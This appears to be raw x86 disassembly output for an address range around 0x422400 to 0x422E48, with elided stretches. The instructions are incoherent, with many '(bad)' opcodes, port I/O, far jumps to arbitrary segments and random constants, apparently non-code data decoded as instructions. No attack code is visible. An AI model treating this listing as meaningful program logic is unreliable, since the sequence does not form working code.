  4223fc:	dec    ebx
  4223fd:	adc    DWORD PTR [edi+edx*1+0x76a42a32],0x90de8403
  422408:	jne    0x422431
  42240a:	fsubr  QWORD PTR [ecx]
  42240c:	lds    eax,FWORD PTR [eax+0xd37579]
	...
  422472:	add    BYTE PTR [eax],al
  422474:	push   edx
  422475:	sub    BYTE PTR [esi],0x69
  422478:	(bad)  
  422479:	in     eax,dx
  42247a:	push   edi
  42247b:	mov    ebx,0x99e531bb
  422480:	adc    eax,0xd96e1cde
  422485:	ins    DWORD PTR es:[edi],dx
  422486:	add    DWORD PTR [eax],eax
  422488:	add    eax,0x84000001
  42248d:	and    BYTE PTR [ecx],cl
  42248f:	pop    ds
  422490:	jnp    0x42246b
  422492:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422493:	popf   
  422494:	test   BYTE PTR [esi+0x5],0x54
  422498:	xchg   BYTE PTR [ebp+0x13],bh
  42249b:	stos   BYTE PTR es:[edi],al
  42249c:	push   0xb
  42249e:	in     eax,dx
  42249f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4224a0:	push   ecx
  4224a1:	sub    bl,cl
  4224a3:	jno    0x4224c6
  4224a5:	cmpps  xmm7,XMMWORD PTR [ecx],0x2f
  4224a9:	aad    0x1c
  4224ab:	fidivr WORD PTR [ebx]
  4224ad:	pop    edx
  4224ae:	std    
  4224af:	int    0x89
  4224b1:	test   DWORD PTR [ebp-0x49],ecx
  4224b4:	sub    eax,0xea27f7f
  4224b9:	inc    eax
  4224ba:	mov    ds:0x112d0b3,al
  4224bf:	pop    ecx
  4224c0:	dec    edi
  4224c1:	and    cl,bl
  4224c3:	mov    ebp,0x67dc13b5
  4224c8:	mov    al,0xb2
  4224ca:	mov    bh,0x77
  4224cc:	daa    
  4224cd:	into   
  4224ce:	dec    esp
  4224cf:	sbb    bl,BYTE PTR [esi-0x15a95e03]
  4224d5:	push   0x22c6c11f
  4224da:	out    0x80,al
  4224dc:	adc    edi,ebp
  4224de:	ins    DWORD PTR es:[edi],dx
  4224df:	or     BYTE PTR [ecx+0x64583041],cl
  4224e5:	or     al,0xf2
  4224e7:	xchg   esi,eax
  4224e8:	fucompp 
  4224ea:	retf   
  4224eb:	daa    
  4224ec:	inc    ecx
  4224ed:	inc    ebx
  4224ee:	fldcw  WORD PTR [edx-0x184a56c2]
  4224f4:	jp     0x42250b
  4224f6:	(bad)  
  4224f7:	pop    ds
  4224f8:	cwde   
  4224f9:	out    0x55,eax
  4224fb:	or     DWORD PTR [edx+0x2d56d9d8],eax
  422501:	mov    bl,0x17
  422503:	mov    WORD PTR [edi+0x8],gs
  422506:	fcomp  QWORD PTR [ecx+ebx*1]
  422509:	adc    eax,DWORD PTR [edi]
  42250b:	cli    
  42250c:	test   al,0xcc
  42250e:	es xchg esi,eax
  422510:	cld    
  422511:	jo     0x4224b5
  422513:	push   esp
  422514:	xlat   BYTE PTR ds:[ebx]
  422515:	add    ebx,esi
  422517:	push   es
  422518:	scas   al,BYTE PTR es:[edi]
  422519:	and    eax,0x86ae247
  42251e:	and    DWORD PTR [ebp+0x6e],0x1a
  422522:	dec    ebp
  422523:	jle    0x4224ab
  422525:	das    
  422526:	push   cs
  422527:	push   0x3e
  422529:	popf   
  42252a:	cli    
  42252b:	repz (bad) 
  42252e:	cmp    esp,ebx
  422530:	pop    ecx
  422531:	mov    esp,DWORD PTR [edx-0x36]
  422534:	stc    
  422535:	mov    ebx,0xd6e3dcfe
  42253a:	test   al,0xc
  42253c:	mov    al,0x7b
  42253e:	sbb    ebx,DWORD PTR gs:[ebp+0x4929d99d]
  422545:	pop    esi
  422546:	jnp    0x4225c2
  422548:	and    al,0x59
  42254a:	mov    eax,0x6eb34a4b
  42254f:	rol    BYTE PTR [esp+ebx*8],cl
  422552:	push   0x60
  422554:	mov    edi,0xe1495217
  422559:	inc    esp
  42255a:	dec    esi
  42255b:	pusha  
  42255c:	inc    edx
  42255d:	fld    DWORD PTR [ecx+0x9782d30]
  422563:	and    ah,BYTE PTR [edx]
  422565:	les    esi,FWORD PTR [ebp-0x74]
  422568:	xchg   edi,eax
  422569:	push   DWORD PTR [ebp+eax*1+0x5f]
  42256d:	and    BYTE PTR ds:0x482813c1,ah
  422573:	fwait
  422574:	cli    
  422575:	retf   0xe07b
  422578:	imul   edx,DWORD PTR [edi+ebp*2],0x1f3027f7
  42257f:	pop    esp
  422580:	push   edi
  422581:	pop    esp
  422582:	mov    al,0x30
  422584:	loop   0x4225f6
  422586:	shl    BYTE PTR [eax],0x60
  422589:	inc    esi
  42258b:	jmp    0x35:0xa4fb17b7
	...
  4225f2:	add    BYTE PTR [eax],al
  4225f4:	call   0xfa77:0xbf778fae
  4225fb:	out    dx,eax
  4225fc:	sbb    esi,DWORD PTR [ecx+0x77bda2f8]
  422602:	mov    ecx,0x16ede25
  422607:	add    BYTE PTR ds:0x41000001,al
  42260d:	add    ecx,ebp
  42260f:	inc    ebp
  422610:	dec    esi
  422611:	stc    
  422612:	fcom   DWORD PTR [ecx]
  422614:	jecxz  0x422659
  422616:	sub    al,0xa9
  422618:	adc    edx,ecx
  42261a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42261b:	enter  0x6a69,0xb2
  42261f:	mov    gs,WORD PTR [eax]
  422621:	push   es
  422622:	xchg   dl,dl
  422624:	jp     0x422647
  422626:	or     BYTE PTR [ecx],bh
  422628:	cmp    eax,0xf99656b2
  42262d:	shl    BYTE PTR [ecx],1
  42262f:	pop    esi
  422630:	inc    edi
  422631:	daa    
  422632:	jg     0x42264b
  422634:	rcl    BYTE PTR [edi],cl
  422636:	pop    ds
  422637:	out    dx,al
  422638:	inc    esp
  422639:	or     cl,bl
  42263b:	push   0x9e3269b5
  422640:	or     al,0x3e
  422642:	icebp  
  422643:	inc    esi
  422644:	pop    ebp
  422645:	xchg   esp,esi
  422647:	lods   eax,DWORD PTR ds:[esi]
  422648:	inc    ebp
  422649:	jno    0x4225f7
  42264b:	push   ecx
  42264c:	push   esi
  42264d:	sar    DWORD PTR [edx],1
  42264f:	mov    ebp,0xa865707b
  422654:	pop    eax
  422655:	fisubr DWORD PTR [eax+0x1]
  422658:	xor    BYTE PTR [esi+0x45094f04],cl
  42265e:	mov    WORD PTR [esi],ss
  422660:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422661:	inc    esi
  422662:	clc    
  422663:	jb     0x4226d2
  422665:	dec    ecx
  422666:	sar    DWORD PTR [ecx],cl
  422668:	mov    BYTE PTR [ebp-0x4c73755c],ah
  42266e:	fld    DWORD PTR [edx-0x41]
  422671:	shl    BYTE PTR [edx+0x659f0dc7],cl
  422677:	mov    bl,0x62
  422679:	popa   
  42267a:	jnp    0x4226d7
  42267c:	jg     0x422655
  42267e:	jge    0x42269e
  422680:	test   al,0xf2
  422682:	ror    ecx,1
  422684:	mov    BYTE PTR [ecx],bh
  422686:	inc    edi
  422687:	pop    eax
  422688:	sub    DWORD PTR [edx-0x51],eax
  42268b:	js     0x42269a
  42268d:	sbb    esi,DWORD PTR [eax-0x17]
  422690:	jno    0x42268c
  422692:	pop    ebp
  422693:	hlt    
  422694:	pop    ecx
  422695:	int3   
  422696:	sbb    DWORD PTR [edi-0x6706814f],ebp
  42269c:	inc    ecx
  42269d:	mov    eax,esp
  42269f:	fwait
  4226a0:	and    eax,DWORD PTR [esi]
  4226a2:	fs mov ecx,0x8e5299ae
  4226a8:	scas   al,BYTE PTR es:[edi]
  4226a9:	mov    ebp,DWORD PTR [edx]
  4226ab:	sbb    edi,DWORD PTR [ecx+0x71]
  4226ae:	xor    DWORD PTR [ebx-0x4e8126f6],0x10
  4226b5:	add    DWORD PTR [eax-0x367bc13e],ebx
  4226bb:	cmp    cl,bl
  4226bd:	inc    ebp
  4226be:	popf   
  4226bf:	loopne 0x422668
  4226c1:	in     al,dx
  4226c2:	add    BYTE PTR [edi],ah
  4226c4:	loope  0x42273a
  4226c6:	js     0x42268a
  4226c8:	jl     0x42267b
  4226ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226cb:	les    ebp,FWORD PTR [ebx-0x19ad65d]
  4226d1:	jle    0x42269d
  4226d3:	in     al,0xe9
  4226d5:	and    DWORD PTR [edi-0x1b100035],esp
  4226db:	pop    edx
  4226dc:	xor    eax,0x79d96ed2
  4226e1:	jne    0x422712
  4226e3:	dec    edi
  4226e4:	add    al,0xce
  4226e6:	sub    bh,BYTE PTR [ebx-0x46]
  4226e9:	cmp    ebp,ebp
  4226eb:	adc    BYTE PTR [eax+0x70],dl
  4226ee:	fwait
  4226ef:	mov    ebp,0x77d9ca2d
  4226f4:	jb     0x42276b
  4226f6:	hlt    
  4226f7:	xor    edi,DWORD PTR [ebp+0x70]
  4226fa:	in     eax,dx
  4226fb:	or     eax,0xfe49827c
  422700:	jns    0x4226ea
  422702:	mov    ds:0xf42acce5,eax
  422707:	in     al,dx
  422708:	fstp   TBYTE PTR [ebx+edx*1-0x40]
  42270c:	bound  ebx,QWORD PTR [esi]
  42270e:	das    
  42270f:	aaa    
  422710:	imul   eax,DWORD PTR [eax],0x0
	...
  422772:	add    BYTE PTR [eax],al
  422774:	daa    
  422775:	sub    eax,0x7d7f2d7d
  42277a:	ja     0x4227ab
  42277c:	mov    esi,0x867f01c8
  422781:	and    dh,BYTE PTR [ecx]
  422783:	ds jecxz 0x4227f5
  422786:	add    DWORD PTR [eax],eax
  422788:	add    eax,0x3a000001
  42278d:	hlt    
  42278e:	sar    DWORD PTR [esi+0x7],1
  422791:	nop    ebx
  422794:	enter  0x831d,0xb
  422798:	mov    edi,0xc2c811c7
  42279d:	das    
  42279e:	nop
  42279f:	xor    al,0x98
  4227a1:	das    
  4227a2:	sub    eax,0x4f33802b
  4227a7:	xchg   ebp,eax
  4227a8:	mov    ecx,0xc84f589a
  4227ad:	test   eax,0x6f38076b
  4227b2:	cmp    al,0x64
  4227b4:	dec    ebp
  4227b5:	pop    es
  4227b6:	xchg   BYTE PTR [ebx],dl
  4227b8:	jno    0x422800
  4227ba:	mov    es,WORD PTR [ecx+edi*1]
  4227bd:	xchg   BYTE PTR [ebx],dl
  4227bf:	icebp  
  4227c0:	sub    al,0x55
  4227c2:	sbb    edx,ecx
  4227c4:	jns    0x422834
  4227c6:	mov    al,ds:0xdb4b0a01
  4227cb:	call   0xd2b8:0xc71c6caf
  4227d2:	out    0x3d,eax
  4227d4:	aaa    
  4227d5:	icebp  
  4227d6:	push   ss
  4227d7:	push   0x31
  4227d9:	shr    ah,cl
  4227db:	add    eax,0x5048aec0
  4227e0:	into   
  4227e1:	fmulp  st(2),st
  4227e3:	sbb    BYTE PTR [edx+0x48],bh
  4227e6:	fcmovbe st,st(3)
  4227e8:	stc    
  4227e9:	lahf   
  4227ea:	stc    
  4227eb:	cld    
  4227ec:	mov    eax,0x9088f5
  4227f1:	jl     0x4227db
  4227f3:	pushf  
  4227f4:	loope  0x422865
  4227f6:	adc    esi,DWORD PTR [edx+0x67afe7fa]
  4227fc:	sti    
  4227fd:	jnp    0x42287c
  4227ff:	ins    DWORD PTR es:[edi],dx
  422800:	ins    BYTE PTR es:[edi],dx
  422801:	dec    edi
  422802:	add    edi,DWORD PTR [ebx]
  422804:	pop    ebx
  422805:	pop    DWORD PTR [esi-0x49]
  422808:	adc    dl,BYTE PTR [eax]
  42280a:	xor    eax,0xb4ba995f
  42280f:	sbb    BYTE PTR [ebp-0x3b5a082c],bl
  422815:	mov    ebx,0xc346dcb9
  42281a:	fcmovbe st,st(4)
  42281c:	push   ebp
  42281d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42281e:	scas   al,BYTE PTR es:[edi]
  42281f:	add    BYTE PTR [edi],ah
  422821:	das    
  422822:	dec    eax
  422823:	push   esi
  422824:	lods   eax,DWORD PTR ds:[esi]
  422825:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422826:	ss inc eax
  422828:	dec    esi
  422829:	jg     0x422814
  42282b:	in     eax,0xe6
  42282d:	in     eax,dx
  42282e:	sub    dl,ah
  422830:	sub    DWORD PTR [ebx],0x50ec92c0
  422836:	mov    ch,0x81
  422838:	dec    edx
  422839:	push   ss
  42283a:	retf   0x3a5
  42283d:	sbb    eax,0xb9b3607b
  422842:	or     BYTE PTR [esi],al
  422844:	mov    edx,esp
  422846:	out    0x96,al
  422848:	leave  
  422849:	in     al,0x30
  42284b:	mov    al,0x19
  42284d:	dec    edx
  42284e:	mov    ecx,0xb4012122
  422853:	sti    
  422854:	call   0x1990:0x250706a2
  42285b:	out    dx,eax
  42285c:	aaa    
  42285d:	lods   al,BYTE PTR ds:[esi]
  42285e:	mov    cl,0xe1
  422860:	ficomp DWORD PTR [edx+0x3a]
  422863:	push   es
  422864:	stos   DWORD PTR es:[edi],eax
  422865:	pop    esi
  422866:	mov    dh,0x26
  422868:	sbb    esp,eax
  42286a:	rcl    ebp,cl
  42286c:	std    
  42286d:	inc    eax
  42286e:	lea    edi,[ebx+edi*2-0x29]
  422872:	fisttp QWORD PTR [esi-0x16]
  422875:	jp     0x422830
  422877:	test   al,0xe9
  422879:	xor    esp,esp
  42287b:	inc    eax
  42287d:	daa    
  42287e:	and    al,0x93
  422880:	stos   BYTE PTR es:[edi],al
  422881:	pop    ss
  422882:	xor    ecx,edx
  422884:	xlat   BYTE PTR ds:[ebx]
  422885:	daa    
  422886:	dec    ebx
  422887:	push   eax
  422888:	sar    DWORD PTR [ebp+0x546f1772],0xb1
  42288f:	sbb    eax,edi
	...
  4228f1:	add    BYTE PTR [eax],al
  4228f3:	add    ch,cl
  4228f5:	cmp    DWORD PTR [eax-0x10680369],edi
  4228fb:	jnp    0x4228bb
  4228fd:	outs   dx,DWORD PTR ds:[esi]
  4228fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4228ff:	loopne 0x422915
  422901:	rcl    DWORD PTR [ecx+0x170e8ee],0x0
  422908:	add    eax,0x25000001
  42290d:	or     eax,0x3fa9549b
  422912:	(bad)  
  422913:	mov    eax,ds:0xc8e22f06
  422918:	inc    BYTE PTR [esi]
  42291a:	and    al,0xd4
  42291c:	imul   edi,eax,0xffffffe2
  42291f:	scas   al,BYTE PTR es:[edi]
  422920:	clc    
  422921:	and    ebp,DWORD PTR [ecx-0x47]
  422924:	push   esp
  422925:	cmp    BYTE PTR [ebx],cl
  422927:	mov    ebx,DWORD PTR [ebp-0x56]
  42292a:	inc    eax
  42292b:	loope  0x42294b
  42292d:	jmp    0x47aa:0x9806b58b
  422934:	xchg   edx,eax
  422935:	inc    edx
  422936:	in     eax,0x3b
  422938:	sub    BYTE PTR [edi+0x20e31cd9],al
  42293e:	icebp  
  42293f:	and    eax,0xaca15f22
  422944:	ds in  eax,dx
  422946:	push   es
  422947:	jg     0x4228df
  422949:	(bad)  
  42294b:	sub    al,0xe5
  42294d:	pop    eax
  42294e:	fistp  QWORD PTR [eax]
  422950:	push   edi
  422951:	lods   eax,DWORD PTR ds:[esi]
  422952:	dec    ecx
  422953:	fidivr DWORD PTR [esi]
  422956:	arpl   WORD PTR [eax-0x21],sp
  422959:	inc    esp
  42295a:	mov    dh,ch
  42295c:	sahf   
  42295d:	in     eax,0x54
  42295f:	jo     0x422908
  422961:	jo     0x422923
  422963:	push   esp
  422964:	enter  0x6f4b,0x6a
  422968:	xchg   esi,eax
  422969:	xchg   ebp,eax
  42296a:	pop    ss
  42296b:	sbb    esp,0xffffffb2
  42296e:	xor    eax,0x280b46e7
  422973:	mov    al,0x45
  422975:	and    BYTE PTR [edi+0xf],dl
  422978:	cmp    bh,BYTE PTR [eax+ebx*2]
  42297b:	fsub   QWORD PTR [esi]
  42297d:	retf   
  42297e:	ins    DWORD PTR es:[edi],dx
  42297f:	mov    bl,BYTE PTR [edx+0x594042aa]
  422985:	mov    ecx,fs
  422987:	mov    esi,0x4ce8bd36
  42298c:	push   esp
  42298d:	mov    al,ds:0xa6e1fc2
  422992:	loop   0x42299d
  422994:	inc    ecx
  422995:	je     0x42296b
  422997:	mov    dh,0x72
  422999:	mov    dl,0xad
  42299b:	bswap  eax
  42299d:	jbe    0x42294c
  42299f:	lahf   
  4229a0:	test   al,0x89
  4229a2:	mov    ah,0xde
  4229a4:	mov    ecx,0x1a98db56
  4229a9:	mov    ch,0x3f
  4229ab:	lds    edx,FWORD PTR [esi]
  4229ad:	adc    ecx,DWORD PTR [edi+0x6c]
  4229b0:	lods   al,BYTE PTR ds:[esi]
  4229b1:	jle    0x422935
  4229b3:	mov    ds:0xc1549c7f,eax
  4229b8:	gs sbb al,0x1c
  4229bb:	jmp    0xad0:0x4f872adb
  4229c2:	mov    bl,0xe6
  4229c4:	in     eax,0xc7
  4229c6:	arpl   WORD PTR [esi+eax*8],ax
  4229c9:	cmp    al,BYTE PTR [esi-0x4b]
  4229cc:	cwde   
  4229cd:	cmp    DWORD PTR [edx-0x48],0x76
  4229d1:	repnz dec esp
  4229d3:	rcl    BYTE PTR [ebp+0x4b19b815],cl
  4229d9:	retf   
  4229da:	(bad)  
  4229db:	jg     0x4229c1
  4229dd:	mov    BYTE PTR [eax],dh
  4229df:	popf   
  4229e0:	xchg   esi,eax
  4229e1:	push   ecx
  4229e2:	or     bh,BYTE PTR [ebp+0x68]
  4229e5:	test   BYTE PTR [ebx],al
  4229e7:	push   cs
  4229e8:	jnp    0x422a19
  4229ea:	mov    al,0xc4
  4229ec:	adc    bh,0xdb
  4229ef:	arpl   WORD PTR [ebx+0x8580208],di
  4229f5:	retf   
  4229f6:	add    al,0x12
  4229f8:	and    esi,esi
  4229fa:	(bad)  
  4229fb:	cmp    eax,0x603dec30
  422a00:	dec    eax
  422a01:	aam    0x8
  422a03:	inc    edi
  422a04:	adc    ebp,DWORD PTR [ebp+ecx*8+0x4d8eb4b3]
  422a0b:	adc    BYTE PTR [edi-0xf0f7888],bl
	...
  422a71:	add    BYTE PTR [eax],al
  422a73:	add    BYTE PTR [esi-0x377e796],dl
  422a79:	cli    
  422a7a:	xchg   esi,eax
  422a7b:	jle    0x422a4e
  422a7d:	push   esp
  422a7e:	je     0x422a3d
  422a80:	adc    al,0x28
  422a82:	mov    esi,0x171ed48
  422a87:	add    BYTE PTR ds:0xee000001,al
  422a8d:	repz test al,0x7a
  422a90:	rcl    ebp,1
  422a92:	imul   esp,DWORD PTR [edi-0x478cc78a],0xb5c1948f
  422a9c:	and    eax,eax
  422a9e:	icebp  
  422a9f:	mov    ah,0x4
  422aa1:	or     BYTE PTR [ebx],cl
  422aa3:	out    dx,eax
  422aa4:	sub    edx,DWORD PTR cs:[ebp+0x2cf38eaa]
  422aab:	jae    0x422aa5
  422aad:	cli    
  422aae:	fld    st(5)
  422ab0:	jo     0x422abf
  422ab2:	push   edx
  422ab3:	fwait
  422ab4:	xor    edi,DWORD PTR [eax+0x5c]
  422ab7:	pop    ecx
  422ab8:	jae    0x422aa9
  422aba:	ficom  WORD PTR [ebx]
  422abc:	and    dl,BYTE PTR [edi+0x75]
  422abf:	in     eax,0xd9
  422ac1:	loopne 0x422ad3
  422ac3:	jmp    0xe542fdaf
  422ac8:	jmp    0x6585:0x494b7831
  422acf:	and    ebx,DWORD PTR [edi]
  422ad1:	out    dx,al
  422ad2:	mov    dl,0x7c
  422ad4:	call   0x1b13:0x2a1cda5c
  422adb:	cmp    al,0xd0
  422add:	loopne 0x422b59
  422adf:	outs   dx,DWORD PTR ds:[esi]
  422ae0:	and    eax,0xc1e4a2a7
  422ae5:	jge    0x422ac9
  422ae7:	outs   dx,DWORD PTR ds:[esi]
  422ae8:	push   ebx
  422ae9:	enter  0x931a,0xe3
  422aed:	imul   esp,DWORD PTR [ecx-0x4f83e098],0x15
  422af4:	dec    esi
  422af5:	push   0x7351024f
  422afa:	fistp  WORD PTR [ebp+0x6c]
  422afd:	jbe    0x422ae4
  422aff:	pop    ebx
  422b00:	paddd  mm4,mm1
  422b03:	mov    al,0xc
  422b05:	inc    BYTE PTR [ecx]
  422b07:	fst    st(2)
  422b09:	arpl   WORD PTR [esi],bx
  422b0b:	fist   WORD PTR [di+0x7d]
  422b0f:	sbb    ch,BYTE PTR [esi-0x5fc79786]
  422b15:	ins    DWORD PTR es:[edi],dx
  422b16:	sub    dh,BYTE PTR [edi-0x5d]
  422b19:	and    DWORD PTR [eax-0x444156ba],ecx
  422b1f:	jl     0x422afc
  422b21:	cs mov ah,0x52
  422b24:	add    ah,BYTE PTR [edx]
  422b26:	es pop es
  422b28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422b29:	mov    al,ds:0xf5c36461
  422b2e:	mov    ?,WORD PTR [esi]
  422b30:	push   ds
  422b31:	adc    DWORD PTR [ebx+0x58312fd5],0x7a
  422b38:	xchg   edx,eax
  422b39:	stos   BYTE PTR es:[edi],al
  422b3a:	mov    DWORD PTR [esp+edi*8-0x5c],0x58b831d5
  422b42:	xor    BYTE PTR [esi-0x7d],ah
  422b45:	pop    edi
  422b46:	sar    ch,cl
  422b48:	addr16 (bad) 
  422b4a:	iret   
  422b4b:	or     eax,0xf51a5a74
  422b50:	mov    al,0x7d
  422b52:	test   al,0x43
  422b54:	retf   
  422b55:	ja     0x422bcd
  422b57:	(bad)  
  422b58:	sub    al,al
  422b5a:	jmp    0x422b40
  422b5c:	cli    
  422b5d:	jg     0x422aed
  422b5f:	push   es
  422b60:	and    ebx,ebp
  422b62:	mov    ch,0x8a
  422b64:	rol    BYTE PTR [ecx-0xc],1
  422b67:	xor    DWORD PTR [eax+0xd],edi
  422b6a:	push   cs
  422b6b:	cmp    esi,DWORD PTR [esi+0x33df8abc]
  422b71:	jbe    0x422b0d
  422b73:	rcl    DWORD PTR [edx+0x306a7c7c],cl
  422b79:	mov    ch,0xf1
  422b7b:	retf   
  422b7c:	test   al,0x76
  422b7e:	sub    al,ch
  422b80:	pusha  
  422b81:	call   0x423b92b8
  422b86:	xor    DWORD PTR [esi-0x782f31c4],edi
  422b8c:	das    
  422b8d:	push   esi
  422b8e:	sub    DWORD PTR [esi-0x72],eax
	...
  422bf1:	add    BYTE PTR [eax],al
  422bf3:	add    BYTE PTR [edi+esi*1+0x4a],al
  422bf7:	fwait
  422bf8:	jnp    0x422bf9
  422bfa:	aad    0xff
  422bfc:	sbb    dl,BYTE PTR [edx-0x71fb264]
  422c02:	pop    es
  422c03:	jp     0x422bf7
  422c05:	jb     0x422c08
  422c07:	add    BYTE PTR ds:0x29000001,al
  422c0d:	xor    BYTE PTR ds:0xcc83ed37,cl
  422c13:	jl     0x422be1
  422c15:	icebp  
  422c16:	sbb    edx,DWORD PTR [esi+0x6b1bfd33]
  422c1c:	sbb    ch,BYTE PTR [esi+edx*1+0x6b62a3d9]
  422c23:	repnz out 0x82,eax
  422c26:	les    edx,FWORD PTR [ebp+0x47]
  422c29:	ins    DWORD PTR es:[edi],dx
  422c2a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422c2b:	dec    esi
  422c2c:	(bad)  
  422c2d:	jmp    0x422c44
  422c2f:	xor    BYTE PTR fs:[ebx-0x2a],al
  422c33:	leave  
  422c34:	mov    edx,0x85ae6371
  422c39:	aam    0x5a
  422c3b:	push   ecx
  422c3c:	sbb    ebx,DWORD PTR [ecx+0x48]
  422c3f:	add    DWORD PTR ds:0x729e5041,ebp
  422c45:	mov    eax,ds:0x66ee72
  422c4a:	lsl    edx,WORD PTR [ecx+0x65f0b730]
  422c51:	shl    ebp,0xc7
  422c54:	cmp    eax,0x500eac9c
  422c59:	push   cs
  422c5a:	xchg   esi,eax
  422c5b:	inc    edi
  422c5c:	dec    esp
  422c5d:	dec    esi
  422c5e:	fmul   st,st(0)
  422c60:	inc    esp
  422c61:	push   es
  422c62:	push   edi
  422c63:	cmp    DWORD PTR [ecx+0x15b7c377],eax
  422c69:	mov    eax,ds:0xb766820b
  422c6e:	xchg   DWORD PTR [eax+0x443ae7bf],esp
  422c74:	pop    edi
  422c75:	ror    DWORD PTR [ebx],cl
  422c77:	inc    ecx
  422c78:	sbb    al,0x5d
  422c7a:	sbb    DWORD PTR [ebx],ebx
  422c7c:	sahf   
  422c7d:	and    DWORD PTR [ebx+0x54],0x113bd6a6
  422c84:	adc    DWORD PTR [edx],edi
  422c86:	je     0x422cb8
  422c88:	xlat   BYTE PTR ds:[ebx]
  422c89:	adc    BYTE PTR [esi+0x43],ah
  422c8c:	adc    DWORD PTR [eax-0x1838a49a],edx
  422c92:	aas    
  422c93:	pop    eax
  422c94:	loope  0x422c93
  422c96:	ret    0x111c
  422c99:	aad    0x21
  422c9b:	pop    ebx
  422c9c:	jmp    0x422cf0
  422c9e:	fs ja  0x422d04
  422ca1:	sub    DWORD PTR [edx],ecx
  422ca3:	pop    ebx
  422ca4:	and    al,0x87
  422ca6:	es (bad) 
  422ca8:	mov    ecx,0x7ecfa175
  422cad:	lock or DWORD PTR [edi+0x1d],0xc0835324
  422cb5:	xchg   esp,eax
  422cb6:	je     0x422d2a
  422cb8:	je     0x422c65
  422cba:	sub    eax,0x850404e2
  422cbf:	jecxz  0x422cd8
  422cc1:	hlt    
  422cc2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422cc3:	and    DWORD PTR [ebp+0x44],esp
  422cc6:	push   es
  422cc7:	loope  0x422cf4
  422cc9:	pop    edx
  422cca:	nop
  422ccb:	loope  0x422c79
  422ccd:	scas   al,BYTE PTR es:[edi]
  422cce:	rol    DWORD PTR [esi-0xcdd088a],cl
  422cd4:	pusha  
  422cd5:	mov    BYTE PTR [eax+0x20],dh
  422cd8:	rol    BYTE PTR [ecx-0x7ee2c3b],0xe5
  422cdf:	and    ah,0xf4
  422ce2:	fsubr  QWORD PTR [ebx]
  422ce4:	(bad)  
  422ce5:	and    eax,0xd972882e
  422cea:	fs jg  0x422cb0
  422ced:	mov    cl,0xfe
  422cef:	dec    esp
  422cf0:	rol    esp,cl
  422cf2:	push   ebp
  422cf3:	fisttp WORD PTR [ecx+0x5a8d1833]
  422cf9:	push   ss
  422cfa:	test   al,0x61
  422cfc:	sub    al,0xb6
  422cfe:	sbb    eax,0xbb06b455
  422d03:	imul   eax,DWORD PTR [ebx-0x20b60f28],0x44c3137a
  422d0d:	cdq    
  422d0e:	in     eax,dx
  422d0f:	lds    esp,FWORD PTR [eax+eax*1+0x0]
	...
  422d72:	add    BYTE PTR [eax],al
  422d74:	mov    edi,0x626d60bd
  422d79:	std    
  422d7a:	mov    edi,0x80797fff
  422d7f:	sub    edi,DWORD PTR [eax-0x89cfd21]
  422d85:	jae    0x422d88
  422d87:	add    BYTE PTR ds:0x72000001,al
  422d8d:	loop   0x422da9
  422d8f:	inc    esi
  422d90:	ficomp WORD PTR [edx-0x4d]
  422d93:	inc    ebx
  422d94:	xchg   esi,eax
  422d95:	pusha  
  422d96:	inc    esp
  422d97:	fwait
  422d98:	cli    
  422d99:	adc    BYTE PTR [eax-0x59],bl
  422d9c:	ins    DWORD PTR es:[edi],dx
  422d9d:	lds    ecx,FWORD PTR [eax]
  422d9f:	dec    edi
  422da0:	lods   al,BYTE PTR ds:[esi]
  422da1:	int    0xe6
  422da3:	mov    BYTE PTR [ebx+edi*1],bl
  422da6:	daa    
  422da7:	into   
  422da8:	and    ebx,DWORD PTR [ecx+esi*1]
  422dab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422dac:	mov    BYTE PTR [esi],0x40
  422daf:	mov    DWORD PTR [edi+0x182fc837],edx
  422db5:	mov    eax,esp
  422db7:	add    bl,BYTE PTR [edx+0x18]
  422dba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422dbb:	mov    ds:0x6d901ddb,eax
  422dc0:	xor    DWORD PTR [esi+0x50ef0d61],eax
  422dc6:	mov    ebp,0x20b8739a
  422dcb:	stc    
  422dcc:	pop    edi
  422dcd:	into   
  422dce:	aaa    
  422dcf:	stos   BYTE PTR es:[edi],al
  422dd0:	sar    DWORD PTR [esp+eiz*2],0x29
  422dd4:	daa    
  422dd5:	mov    esp,0x433a2fca
  422dda:	repz sbb DWORD PTR [ecx],eax
  422ddd:	and    eax,DWORD PTR [ecx]
  422ddf:	push   0x48
  422de1:	sbb    DWORD PTR [edx+0x2c56d699],edi
  422de7:	leave  
  422de8:	das    
  422de9:	add    al,BYTE PTR [ebp+ecx*2-0x374aaa6f]
  422df0:	mov    al,ds:0x65f1a1c0
  422df5:	fdiv   QWORD PTR [ebx+0x1e]
  422df8:	stos   BYTE PTR es:[edi],al
  422df9:	xchg   ecx,eax
  422dfa:	and    al,0xa9
  422dfc:	ins    BYTE PTR es:[edi],dx
  422dfd:	inc    esp
  422dfe:	mov    eax,ds:0x9c116d93
  422e03:	pop    ecx
  422e04:	pop    edi
  422e05:	dec    esi
  422e06:	adc    al,0x54
  422e08:	xchg   edx,ebp
  422e0a:	mov    DWORD PTR [edx-0x40],ebx
  422e0d:	neg    BYTE PTR [eax-0x4e]
  422e10:	and    DWORD PTR ds:0x57ceb5de,ebp
  422e16:	jns    0x422ded
  422e18:	and    eax,0x3bed8a85
  422e1d:	pop    esi
  422e1e:	xchg   edx,eax
  422e1f:	xchg   esi,eax
  422e20:	xchg   esi,eax
  422e21:	jo     0x422db0
  422e23:	call   0x97d0:0x144c70b3
  422e2a:	idiv   DWORD PTR [ebp+0x76aa536c]
  422e30:	jns    0x422e1a
  422e32:	scas   eax,DWORD PTR es:[edi]
  422e33:	push   edi
  422e34:	jp     0x422e9e
  422e36:	and    DWORD PTR [edx],0x4b56a234
  422e3c:	outs   dx,BYTE PTR ds:[esi]
  422e3d:	mov    ecx,0x820d1fb7
  422e42:	daa    
  422e43:	sub    eax,0x65950c5d
  422e48:	mov    ecx,0x224993a7
